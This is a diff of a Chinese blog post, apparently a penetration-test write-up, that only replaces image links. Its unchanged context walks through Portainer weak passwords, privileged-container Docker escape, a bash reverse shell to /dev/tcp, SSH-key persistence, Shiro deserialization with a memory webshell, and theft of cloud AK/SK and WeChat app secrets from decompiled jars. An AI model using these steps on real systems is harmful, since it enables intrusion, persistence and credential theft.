@@ -14,31 +14,31 @@
 <meta property="og:description" content="一. 思路1Portainer弱口令-Docker逃逸-写入SSH公钥  shiro反序列化-注入内存马-反编译jar-接管云主机 二.简单的Docker逃逸1.Protainer弱口令Portainer常见的操作docker的图形化工具，轻量又好用，但是有不少Portainer存在弱口令，诸如：portainer&#x2F;portainer；admin&#x2F;12345678；portai">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/tianjia.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884303673-87132df2-45c4-4ce2-b1b1-45f03b413501.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884376434-1f85df6a-799c-4ef4-99ca-2486affd82f8.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884400115-5366610f-2f17-460b-91f0-6db05e934f75.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884424906-b92b97e1-9a5e-4d92-9f24-2e6ae7bd22c9.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884465197-05da59ed-9a62-45d1-9240-680ee562b6eb.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694883781658-c5ca86ed-ee88-4e81-a5b0-ea4d4593ef26.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694883919978-b30532d1-210d-4cb8-b787-275aca0ea81e.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884094442-6634b1c2-d695-446d-9f31-f1d7a0f1286e.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884908234-b67749cb-d5a2-46b3-8ab4-947cbc2c0861.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885031494-e40db313-c3fd-4032-8b2e-85e6697b585b.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885081633-61934e20-c291-4ba1-8f33-e707486d6166.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885230984-d8277f4c-68c4-47df-9b10-2ed5ca989211.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885192468-c4f0a203-e094-41fa-9591-6b2d4534db68.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885385017-052c6e38-d99e-482e-b09d-d3c7519d6957.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890240924-3328d42d-7875-4295-96ea-385f016510f2.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890233243-8a4d545d-9322-4870-9c65-cf97e31b9f81.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890213677-d9fbaa3a-92f1-4f2e-90b4-68aa1de23f5a.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890207081-8ab1a4fd-cfef-4ecd-b507-9390df94d479.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890192860-8b234055-fc75-4112-91c6-25861ba13518.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890183192-91b29399-caaf-4e17-988f-dcb17d20b148.png">
-<meta property="og:image" content="c:/Users/joker/Desktop/无锡市网安行动文件/vul-sub-img/image-20230917025851808.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890171594-2cc79b89-7407-443b-bda0-e6166171d76f.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/jpeg/1250698/1694890154949-f749a52c-f036-4788-b9db-4f577d59ac70.jpeg">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/tequanmoshi.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/bushurongqi.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/running.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/intorongqi.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/cantifconfig.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/fdisk-l.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/mkdirli1u.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/rev-shell.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/lsssh.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/shengcmiyao.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/gongyaocontent.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/xieruyonggao.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/zhuijiacg.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/gongyaolianjie.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/lianjiesuccess.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917021346614.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022334656.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022418514.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022436489.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022544603.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917025851808.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917023226923.png">
+<meta property="og:image" content="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/9ef582612c6bce21e1c40f750925ff6.jpg">
 <meta property="article:published_time" content="2023-09-16T17:51:11.000Z">
-<meta property="article:modified_time" content="2023-09-16T19:12:14.917Z">
+<meta property="article:modified_time" content="2023-09-16T19:33:10.550Z">
 <meta property="article:author" content="li1u">
 <meta property="article:tag" content="漏洞挖掘">
 <meta name="twitter:card" content="summary">
@@ -221,7 +221,7 @@
       
         <time datetime="2023-09-16T17:51:11.000Z" itemprop="datePublished">2023-09-17</time>
         
-        (Updated: <time datetime="2023-09-16T19:12:14.917Z" itemprop="dateModified">2023-09-17</time>)
+        (Updated: <time datetime="2023-09-16T19:33:10.550Z" itemprop="dateModified">2023-09-17</time>)
         
       
     </div>
@@ -245,46 +245,46 @@
 <h2 id="二-简单的Docker逃逸"><a href="#二-简单的Docker逃逸" class="headerlink" title="二.简单的Docker逃逸"></a>二.简单的Docker逃逸</h2><h3 id="1-Protainer弱口令"><a href="#1-Protainer弱口令" class="headerlink" title="1.Protainer弱口令"></a>1.Protainer弱口令</h3><p>Portainer常见的操作docker的图形化工具，轻量又好用，但是有不少Portainer存在弱口令，诸如：portainer&#x2F;portainer；admin&#x2F;12345678；portainer&#x2F;12345678等等，注意密码长度差不多都是8位……</p>
 <h3 id="2-特权模式逃逸"><a href="#2-特权模式逃逸" class="headerlink" title="2.特权模式逃逸"></a>2.特权模式逃逸</h3><p>弱口令进入portainer之后，尝试挂载根目录进行逃逸失败，随即尝试特权模式进行Docker逃逸</p>
 <p>添加容器：</p>
-<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/tianjia.png" alt="img"></p>
-<p>以特权模式运行容器：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884303673-87132df2-45c4-4ce2-b1b1-45f03b413501.png" alt="image.png"><br>随后部署容器即可：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884376434-1f85df6a-799c-4ef4-99ca-2486affd82f8.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/tianjia.png" alt="image.png"></p>
+<p>以特权模式运行容器：<br><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/tequanmoshi.png" alt="image.png"><br>随后部署容器即可：</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/bushurongqi.png" alt="img"></p>
 <p>随后查看容器列表、确保容器正常运行：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884400115-5366610f-2f17-460b-91f0-6db05e934f75.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/218/running.png" alt="img"></p>
 <p>以root进入容器：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884424906-b92b97e1-9a5e-4d92-9f24-2e6ae7bd22c9.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/intorongqi.png" alt="img"></p>
 <p>正常情况下，很多命令不能使用：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884465197-05da59ed-9a62-45d1-9240-680ee562b6eb.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/cantifconfig.png" alt="img"></p>
 <p>首先、查看当前磁盘分区情况，获得宿主机分区：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l </span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694883781658-c5ca86ed-ee88-4e81-a5b0-ea4d4593ef26.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/fdisk-l.png" alt="img"></p>
 <p>获取宿主机磁盘为&#x2F;dev&#x2F;vda1</p>
 <p>挂载宿主机磁盘:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> li1u  ----创建文件</span><br><span class="line"></span><br><span class="line">mount /dev/vda1 /li1u/  ----挂载至文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">chroot</span> /li1u/  ----在li1u根目录下运行</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694883919978-b30532d1-210d-4cb8-b787-275aca0ea81e.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/mkdirli1u.png" alt="img"></p>
 <h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h3><p>尝试反弹shell:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/xxx/8000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p>成功反弹：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884094442-6634b1c2-d695-446d-9f31-f1d7a0f1286e.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/rev-shell.png" alt="img"></p>
 <h3 id="4-写入SSH公钥"><a href="#4-写入SSH公钥" class="headerlink" title="4.写入SSH公钥"></a>4.写入SSH公钥</h3><p>反弹shell成功之后，尝试写ssh公钥做个小的权限维持：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694884908234-b67749cb-d5a2-46b3-8ab4-947cbc2c0861.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/lsssh.png" alt="img"></p>
 <p>用xshell生成一个用户密钥：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885031494-e40db313-c3fd-4032-8b2e-85e6697b585b.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/shengcmiyao.png" alt="img"></p>
 <p>随后点击属性-公钥，复制公钥内容：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885081633-61934e20-c291-4ba1-8f33-e707486d6166.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/gongyaocontent.png" alt="img"></p>
 <p>使用echo命令追加公钥到authorized_keys中：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885230984-d8277f4c-68c4-47df-9b10-2ed5ca989211.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/xieruyonggao.png" alt="img"></p>
 <p>cat authorized_keys追加成功：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885192468-c4f0a203-e094-41fa-9591-6b2d4534db68.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/zhuijiacg.png" alt="img"></p>
 <p>尝试使用xshell连接（前期信息收集得知ssh开放端口2021）</p>
 <p>用户身份验证选择publickey（公钥登录），平常都是用户名密码连接：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694885385017-052c6e38-d99e-482e-b09d-d3c7519d6957.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/gongyaolianjie.png" alt="img"></p>
 <p>击设置，选择刚刚生成的密钥，填入自己设置的密码进行连接即可：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890240924-3328d42d-7875-4295-96ea-385f016510f2.png" alt="img"><br>接下来就是内网了……</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/lianjiesuccess.png" alt="img"><br>接下来就是内网了……</p>
 <h2 id="三-反编译jar接管云主机"><a href="#三-反编译jar接管云主机" class="headerlink" title="三. 反编译jar接管云主机"></a>三. 反编译jar接管云主机</h2><h3 id="1-shiro反序列化-注内存马"><a href="#1-shiro反序列化-注内存马" class="headerlink" title="1. shiro反序列化-注内存马"></a>1. shiro反序列化-注内存马</h3><p>常规操作，就不多说了，打入冰蝎内存马：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890233243-8a4d545d-9322-4870-9c65-cf97e31b9f81.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917021346614.png" alt="img"></p>
 <h3 id="2-扩大成果（查找敏感信息）"><a href="#2-扩大成果（查找敏感信息）" class="headerlink" title="2.扩大成果（查找敏感信息）"></a>2.扩大成果（查找敏感信息）</h3><p>连接之后，尝试查找敏感信息：<br>前期信息收集得知目标为SpringBoot框架，spring的配置文件都是yml和properties，linux直接查找指定后缀名的文件，未发现敏感信息</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *.yml .properties</span><br></pre></td></tr></table></figure>
 <h3 id="3-反编译jar获取大量配置信息"><a href="#3-反编译jar获取大量配置信息" class="headerlink" title="3.反编译jar获取大量配置信息"></a>3.反编译jar获取大量配置信息</h3><p>随后翻到网站根目录，发现了不同文件夹下边有三个jar包，应该都打包成jar运行了。</p>
@@ -292,14 +292,14 @@
 <blockquote>
 <p>方法一：修改文件扩展名</p>
 </blockquote>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890213677-d9fbaa3a-92f1-4f2e-90b4-68aa1de23f5a.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022334656.png" alt="img"></p>
 <p>修改jar扩展名为zip等，直接解压即可：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890207081-8ab1a4fd-cfef-4ecd-b507-9390df94d479.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022418514.png" alt="img"></p>
 <p>在clsses文件夹下，找到properties配置文件：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890192860-8b234055-fc75-4112-91c6-25861ba13518.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022436489.png" alt="img"></p>
 <p>获取ak&#x2F;sk：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890183192-91b29399-caaf-4e17-988f-dcb17d20b148.png" alt="img"><br>使用ak&#x2F;sk利用工具或者行云管家导入云主机即可</p>
-<p><img src="C:\Users\joker\Desktop\无锡市网安行动文件\vul-sub-img\image-20230917025851808.png" alt="image-20230917025851808"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917022544603.png" alt="img"><br>使用ak&#x2F;sk利用工具或者行云管家导入云主机即可</p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917025851808.png" alt="image-20230917025851808"></p>
 <p>其中OSS存储桶中发现大量敏感信息<br>还有vx小程序的appid和secret，直接调用官方API即可：</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;appid=APPID&amp;secret=APPSECRET</span><br></pre></td></tr></table></figure>
 <p>利用官方API还可获取小程序反馈情况、小程序用户访问数据、发送信息等等等等，几近接管小程序</p>
@@ -307,8 +307,8 @@
 <p>方法二：jd-gui反编译jar</p>
 </blockquote>
 <p>直接拖动jar包到jd-gui中即可：同样的配置信息</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/1250698/1694890171594-2cc79b89-7407-443b-bda0-e6166171d76f.png" alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/1250698/1694890154949-f749a52c-f036-4788-b9db-4f577d59ac70.jpeg" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/image-20230917023226923.png" alt="img"></p>
+<p><img src="https://huc-1259038394.cos.ap-chengdu.myqcloud.com/Blog/images/20230917/9ef582612c6bce21e1c40f750925ff6.jpg" alt="img"></p>
 
   </div>
 </article>
